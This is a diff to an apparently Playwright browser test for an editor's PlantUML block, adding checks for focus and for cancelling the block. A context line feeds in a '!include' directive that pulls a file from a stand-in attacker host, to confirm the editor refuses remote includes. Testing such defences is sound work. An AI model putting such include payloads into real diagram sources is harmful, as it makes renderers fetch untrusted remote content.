@@ -171,6 +171,10 @@ test("refuses PlantUML includes and renders PlantUML in the browser", async ({ p
   await insertBlock(page, "/plantuml", /^PlantUML diagram/);
   const block = page.locator('[data-diagram="plantuml"]');
   const source = block.getByLabel("Source of the PlantUML diagram");
+  await expect(source).toBeFocused();
+  await block.getByRole("button", { name: "Cancel" }).click();
+  await expect(block).toHaveCount(0);
+  await insertBlock(page, "/plantuml", /^PlantUML diagram/);
   await source.fill("@startuml\n!include https://evil.example/x.puml\nAlice -> Bob: Hello\n@enduml");
   await expect(block.getByText(/Including files or addresses is turned off/)).toBeVisible({
     timeout: 20_000,
